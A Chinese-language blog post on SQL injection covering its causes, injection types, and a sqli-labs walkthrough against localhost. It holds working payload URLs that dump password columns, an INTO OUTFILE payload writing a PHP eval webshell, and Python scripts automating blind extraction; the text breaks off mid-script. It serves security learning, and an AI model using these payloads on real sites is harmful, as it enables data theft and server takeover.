        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL注入作为经典漏洞面试时经常问到。虽然使用sqlmap，xray等工具已经可以完全覆盖sql注入漏洞的验证到利用，但是为了告别手工测试时只会在参数后面打单引号的尴尬，我决定结合靶场实践对sql注入漏洞做一次全面的总结。</p><hr><h2 id="SQL注入产生原理"><a href="#SQL注入产生原理" class="headerlink" title="SQL注入产生原理"></a>SQL注入产生原理</h2><p>web应用程序没有对用户输入的合法性做判断，前端传入后端的参数是攻击者可控的，并且后端将参数带入数据库查询。由此攻击者可以构造sql语句对数据库进行操作。</p><ul><li>参数用户可控</li><li>传入参数拼接到SQL语句，带入数据库查询</li><li>应用程序对用户的输入没有进行严格的过滤</li></ul><h2 id="SQL注入基础知识"><a href="#SQL注入基础知识" class="headerlink" title="SQL注入基础知识"></a>SQL注入基础知识</h2><p>mysql5.0之后，默认有<code>information_schema</code>数据库，其中<code>SCHEMATA</code> 表的<code>SCHEMA_NAME</code>字段记录所有数据库名。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630183627457.png" alt="image-20220630183627457"></p><p><code>TABLES</code>表的<code>TABLE_SCHEMA</code>字段记录所有数据库名，<code>TABLE_NAME</code>字段记录表名</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630183850167.png" alt="image-20220630183850167"></p><p>COLUMNS表的<code>TABLE_SCHEMA</code> <code>TABLE_NAME</code> <code>COLUMN_NAME</code>字段分别记录所有数据库的库名，表名和字段名。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630184021096.png" alt="image-20220630184021096"></p><p>通过运用这三个表进行查询，即可得知全部数据库的库名，表名和字段名。后续可以针对性的进行查询。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630184244385.png" alt="image-20220630184244385"></p><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><ul><li>Mysql 有三种常用注释符：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 注意，这种注释符后边有一个空格</span><br><span class="line"></span><br><span class="line"># 通过#进行注释</span><br><span class="line"></span><br><span class="line">/* */ 注释掉符号内的内容</span><br></pre></td></tr></table></figure><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul><li>group_concat() 函数，多条数据变为一条输出</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630215437544.png" alt="image-20220630215437544"></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630215304327.png" alt="image-20220630215304327"></p><ul><li>limit()  可以控制输出的行数</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701205826363.png" alt="image-20220701205826363"></p><p>输出一行，偏移量为0行</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701205901061.png" alt="image-20220701205901061"></p><ul><li>outfile</li></ul><p>outfile函数就是将数据库的查询内容导出到一个外部文件，前提是知道路径</p><p><code>show variables like &#39;%secure%&#39;;</code>查看本机数据库的导出目录，如果随便导出到一个文件夹就会报错</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701220038747.png" alt="image-20220701220038747"></p><p>secure_file_priv值为空时没有限制，成功写入文件</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701220124350.png" alt="image-20220701220124350"></p><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>按照参数类型分类：数字型和字符型。</p><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">测试步骤：</span><br><span class="line"></span><br><span class="line">（1） 加单引号，URL：www.text.com/text.php?id=3’</span><br><span class="line">对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</span><br><span class="line"></span><br><span class="line">（2） 加and 1=1 ,URL：www.text.com/text.php?id=3 and 1=1</span><br><span class="line">对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</span><br><span class="line"></span><br><span class="line">（3） 加and 1=2，URL：www.text.com/text.php?id=3 and 1=2</span><br><span class="line">对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</span><br></pre></td></tr></table></figure><p>如果满足以上三点，则可以判断该URL存在数字型注入。</p><p>见<a href="#Less-2">Less-2</a></p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符型sql语句如下：select * from table where name=&#x27;admin&#x27;</span><br><span class="line">在构造payload时通过闭合单引号可以成功执行语句：</span><br></pre></td></tr></table></figure><p>见<a href="#Less-1">Less-1</a></p><h3 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h3><p>SQL注入sql语句查询有回显时，可以使用Union注入获取数据</p><ul><li>出现两个及以上的<code>select</code></li><li>select 的列数要相同</li><li>可以使用union，列的数据类型必须兼容，兼容的含义是必须数据库可以隐含转换他们的类型</li></ul><p>先使用order by确认列数，即可使用union select查询，结果在回显位中</p><p>见Less1-4</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入就是通过人为的引起数据库的报错，但是数据库在报错的同时会将查询的结果也呈现在报错中</p><p>报错注入有很多函数可以利用</p><p>见<a href="#Less-5">Less-5，6</a></p><ul><li>exp</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (PAYLOAD)a));</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701213025348.png" alt="image-20220701213025348"></p><ul><li>updatexml</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(PAYLOAD),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701213605276.png" alt="image-20220701213605276"></p><p>要在where之后才执行</p><ul><li>group by floor 报错（mysql 5 可用）「重复键报错」</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(PAYLOAD),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701214211007.png" alt="image-20220701214211007"></p><p>原理<a href="https://ro0t.top/cn/SQL%E6%B3%A8%E5%85%A5/#group-by-floor-%E6%8A%A5%E9%94%99mysql-5-%E5%8F%AF%E7%94%A8%E9%87%8D%E5%A4%8D%E9%94%AE%E6%8A%A5%E9%94%99">参考连接</a> </p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><ul><li>length函数 返回字段长度</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702153949919.png" alt="image-20220702153949919"></p><ul><li>substr函数 切割字符串</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702154324811.png" alt="image-20220702154324811"></p><ul><li>ascii函数 将字符转换为ascii码值，一次只能转换一位</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702154640626.png" alt="image-20220702154640626"></p><h4 id="Bool盲注"><a href="#Bool盲注" class="headerlink" title="Bool盲注"></a>Bool盲注</h4><p>没有回显或报错信息，只会返回正常（True）页面和不正常（False）页面。根据正常不正常的页面返回看是否有注入。</p><p>见 <a href="#Less-8">Less-8</a></p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>响应中没有任何信息，只能通过服务器响应的延时来判断sql语句是否执行。</p><ul><li>if函数</li></ul><p>MySQL中if函数语法如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(expr,v1,v2)</span><br></pre></td></tr></table></figure><p>其中：表达式 expr 得到不同的结果，当 expr 为真是返回 v1 的值，否则返回 v2.</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702162015999.png" alt="image-20220702162015999"></p><p>见<a href="#Less-9">Less-9</a></p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入也称为存储型注入，就是将可能导致 SQL 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 SQL 注入。</p><p>二次注入的出现和代码逻辑关系密切。</p><p>见<a href="#Less-24">Less-24</a></p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>当数据库采用gbk编码时，由于编码问题，导致数据库吃掉转义引号的反斜杠，从而引发宽字节注入。</p><p>宽字节的格式先打一个<code>%df</code>，因为反斜杠的编码是<code>%5c</code>，在GBK编码中，<code>%df%5c</code>是一个繁体字。在这时原本被转义的单引号成功逃逸。</p><p>所以理论上只要低位的范围中含有<code>0x5c</code>的编码，就可以进行宽字符注入。</p><p>见<a href="#Less-32">Less-32</a></p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠注入，就是通过<code>;</code>将两个sql语句分开，在执行完第一个语句之后，后面的语句可以由攻击者任意指定，可以执行非查询语句，更改数据库配置，进行UDF提权等操作。该种注入威胁更大。</p><p><strong>mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。（有这个函数才能进行堆叠）</strong></p><p>不过这种攻击通常不能获得第二条语句的执行结果，可以使用update先写后查来获取数据，或者时间盲注，以及其它外带数据技巧。</p><p>见<a href="#Less-38">Less-38</a></p><h2 id="sqli-labs-靶场"><a href="#sqli-labs-靶场" class="headerlink" title="sqli-labs 靶场"></a><strong>sqli-labs</strong> 靶场</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>上来先打一个单引号，报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1%27</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1%27%20and%201=1--+</span><br><span class="line">正常</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=1%27%20and%201=2--+</span><br><span class="line">不报错，但无结果</span><br></pre></td></tr></table></figure><p>通过上文方法可以判断这是一个字符型注入，因此需要闭合单引号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>通过order by获取字段数量，可以判断字段数为3</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630210740196.png" alt="image-20220630210740196"></p><p>使用联合查询判断回显位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=-1%27%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630212815275.png" alt="image-20220630212815275"></p><blockquote><p>为什么id=-1 才能有回显？</p></blockquote><p>经过测试发现不一定非得是-1，一个极大数字比如1000也可以回显。关于这个问题我上手调试了一下</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630213639489.png" alt="image-20220630213639489"></p><p>当第一个select有结果时，返回两条数据。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630213732638.png" alt="image-20220630213732638"></p><p>第一个select无结果时，就只有一条数据了，这样原有的回显位就成了union select的内容。</p><blockquote><p>可惜没把数据库教材带回来，教材关于union select的用法肯定更详细</p></blockquote><p>有了回显便可以构造sql语句查询了</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630214300624.png" alt="image-20220630214300624"></p><p>我们现在已经知道了数据库名security，接下来去<code>information_schema.COLUMNS</code>中查询表名和字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=dds%27%20union%20select%201,(select%20group_concat(TABLE_NAME)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=%22security%22),user()--+</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630214959998.png" alt="image-20220630214959998"></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630215632522.png" alt="img"></p><blockquote><p>这里出现问题了，我的数据库里不止一张表叫users，导致查出很多字段名，应该再多加一个条件</p></blockquote><p>查询所有用户名和密码</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630220733508.png" alt="image-20220630220733508"></p><p>第一关结束</p><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?id=1%20%20and%201=1--+正常</span><br><span class="line">http://127.0.0.1/sqli/Less-2/?id=1%20%20and%201=2--+不报错 无查询结果</span><br></pre></td></tr></table></figure><p>看来第二关是一个数字型的注入，无需闭合单引号。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630221421399.png" alt="image-20220630221421399"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>将第一关payload的单引号去掉即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?id=-1%20union%20select%201,(select%20group_concat(TABLE_NAME)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=%22security%22),user()--+</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630221707361.png" alt="image-20220630221707361"></p><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>通过报错结果来看，多了一个）</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701204544840.png" alt="image-20220701204544840"></p><p>使用<code>&#39;)</code>来闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-3/?id=1%27)%20and%201=1%20--+</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701204756050.png" alt="image-20220701204756050"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>修改paylaod即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-3/?id=-1%27)union%20select%201,(select%20group_concat(TABLE_NAME)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=%22security%22),user()--+</span><br></pre></td></tr></table></figure><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>单引号正常没反应，双引号报错</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701210203958.png" alt="image-20220701210203958"></p><p>使用 <code>&quot;)</code>闭合</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701210311764.png" alt="image-20220701210311764"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-4/?id=-1%22)%20union%20select%201,(select%20group_concat(password)%20from%20security.users),3--+</span><br><span class="line"></span><br><span class="line">http://localhost/sqli/Less-4/?id=-1%22)%20union%20select%201,(select%20password%20from%20security.users%20limit%202,1),3--+</span><br></pre></td></tr></table></figure><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>没有回显位，要使用报错注入了</p><p><a href="http://localhost/sqli/Less-5/?id=3%27%20%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--+">http://localhost/sqli/Less-5/?id=3%27%20%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--+</a></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701212555931.png" alt="image-20220701212555931"></p><p>替换paylaod即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-5/?id=3%27%20%20and%20updatexml(1,concat(0x7e,(select%20group_concat(password)%20from%20security.users),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701212732179.png" alt="image-20220701212732179"></p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>双引号闭合即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-6/?id=3&quot;%20%20and%20updatexml(1,concat(0x7e,(select%20group_concat(password)%20from%20security.users),0x7e),1)--+</span><br></pre></td></tr></table></figure><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>不显示具体报错信息了，甚至都找不到怎么闭合，看了源码才知道两个括号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-7/?id=1%27))--+</span><br></pre></td></tr></table></figure><p>提示使用outfile，我觉得用bool盲注也可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-7/?id=-1%27))union%20select%201,(select%20group_concat(password)%20from%20security.users),3%20into%20outfile%20%20%22C:\\wamp\\www\\result.txt%22--+</span><br></pre></td></tr></table></figure><p>使用group_concat()函数确保前后查询列数一致</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701221621961.png" alt="image-20220701221621961"></p><p>还可以写webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-7/?id=-1%27))union%20select%201,%22%3C?php%20@eval($_GET[%27shell%27]);?%3E%22,3%20into%20outfile%20%20%22C:\\wamp\\www\\result.php%22--+</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220701222105666.png" alt="image-20220701222105666"></p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>没有任何报错信息，使用单引号闭合后仍然可以使用outfile函数写shell的方式利用。</p><p>继续跟着提示来，使用Bool盲注技巧。</p><p>先判断数据库名长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1%27%20and%20length(database())=7--+ 无查询结果</span><br><span class="line">http://localhost/sqli/Less-8/?id=1%27%20and%20length(database())=8--+ 正常</span><br></pre></td></tr></table></figure><p>再使用substr和ascii函数判断数据库名第一位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1%27%20and%20(ascii(substr(database(),1,1))=114)--+ 无查询结果</span><br><span class="line">http://localhost/sqli/Less-8/?id=1%27%20and%20(ascii(substr(database(),1,1))=115)--+ 正常</span><br></pre></td></tr></table></figure><p>可知数据库名第一位是<code>s</code>，以此类推。</p><p>盲注利用起来过程十分繁琐，可以写一个脚本自动完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;http://localhost/sqli/Less-8/?id=1%27%20and%20length(database())=&#123;&#125;--+&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;http://localhost/sqli/Less-8/?id=1%27%20and%20(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)--+&quot;</span></span><br><span class="line"></span><br><span class="line">length =<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    res = requests.get(payload1.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        length = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        res = requests.get(payload2.<span class="built_in">format</span>(i,j))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702160137864.png" alt="image-20220702160137864"></p><p>一个很简陋的脚本，要想实现sqlmap那样完全自动化注入还是要下很大功夫的。</p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>这一关无论输入什么页面都没变化，使用时间盲注技巧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli/Less-9/?id=1%27and%20if(ascii(substr(database(),1,1))=115,%20sleep(5),%200)%20--+</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220702162259287.png" alt="image-20220702162259287"></p><p>响应时间大于五秒，可知数据库名第一个字符是<code>s</code></p><p>编写脚本利用，使用<code>elapsed.total_seconds()</code>函数获取响应时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;http://localhost/sqli/Less-9/?id=1%27%20and%20if(length(user())=&#123;&#125;,sleep(1),0)--+&quot;</span></span><br><span class="line">payload = <span class="string">&quot;http://localhost/sqli/Less-9/?id=1%27and%20if(ascii(substr(user(),&#123;&#125;,1))=&#123;&#125;,%20sleep(1),%200)%20--+&quot;</span></span><br><span class="line"></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span 